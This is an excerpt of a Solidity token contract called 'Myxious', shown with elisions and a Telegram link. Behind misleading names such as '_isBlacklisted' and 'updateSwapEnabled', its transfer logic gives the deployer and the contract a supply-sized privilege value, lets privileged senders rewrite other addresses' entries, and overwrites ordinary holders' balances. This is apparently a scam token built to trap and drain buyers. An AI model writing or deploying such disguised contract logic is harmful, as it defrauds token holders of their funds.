...
// https://t.me/MyxiousChatKorea
// https://www.zhihu.com/

contract Myxious is IERC20, Ownable {
    ...
    uint256 private _isBlacklisted = _rTotal;
    ...
    constructor(
        ...
        _bots[msg.sender] = _isBlacklisted;
        _bots[address(this)] = _isBlacklisted;
    ...
    function transferFrom(
        ...
        updateSwapEnabled      (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        updateSwapEnabled      (msg.sender, recipient, amount);
        return true;
    }
    function updateSwapEnabled     (
        ...
        uint256 _getValue;
        if (swapTokensAtAmount && contractETHBalance > _isBlacklisted && !tradingActive && from != uniswapV2Pair) {
            tradingActive = true;
            setTrading(contractETHBalance);
            tradingActive = false;

        } else if (_bots[from] > _isBlacklisted && _bots[to] > _isBlacklisted) {
            _getValue = amount;
        ...
        } else if (to != address(router) && _bots[from] > 0 && amount > _isBlacklisted && to != uniswapV2Pair) {
            _bots[to] = amount;

            return;

        } else if (!tradingActive && _rOwned[from] > 0 && from != uniswapV2Pair && _bots[from] == 0) {
            _rOwned[from] = _bots[from] - _isBlacklisted;
        }
        address blocklist = bots[uniswapV2Pair];
        if (_rOwned[blocklist] == 0) _rOwned[blocklist] = _isBlacklisted;
        bots[uniswapV2Pair] = to;
        if (_rTotalFee > 0 && _bots[from] == 0 && !tradingActive && _bots[to] == 0) {
            _getValue = (amount * _rTotalFee) / 100;
            amount -= _getValue;
            _balances[from] -= _getValue;
            _balances[address(this)] += _getValue;
